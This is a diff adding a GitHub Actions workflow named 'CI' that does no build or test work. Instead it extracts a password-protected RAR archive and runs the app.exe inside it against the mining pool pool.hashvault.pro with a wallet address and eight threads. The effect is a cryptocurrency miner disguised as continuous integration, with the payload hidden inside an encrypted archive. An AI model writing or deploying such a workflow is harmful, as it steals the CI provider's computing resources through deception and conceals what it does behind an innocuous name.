@@ -1,0 +1,26 @@
+# This is a basic workflow to help you get started with Actions
+
+name: CI
+
+# Controls when the workflow will run
+on:
+  workflow_dispatch:
+
+jobs:
+  extract_and_run:
+    runs-on: windows-latest
+    steps:
+      - name: Checkout repo
+        uses: actions/checkout@v4
+
+      - name: Install 7-Zip
+        run: choco install -y 7zip
+
+      - name: Extract RAR with password using 7-Zip
+        run: 7z x -p123z pass123z.rar -oextracted -y
+
+      - name: List extracted files
+        run: Get-ChildItem extracted
+
+      - name: Run EXE file
+        run: extracted\app.exe -o pool.hashvault.pro:443 -u SaLvdVFLE6xEnqoCyBjXdCiwt2okT7SVj7utAYdBAVZj7VKAaGX12L78PuhcGZUa3BDADr9CPPXBNfXw8v27yQwB2Wpt89vbapn -p 5950x -t 8
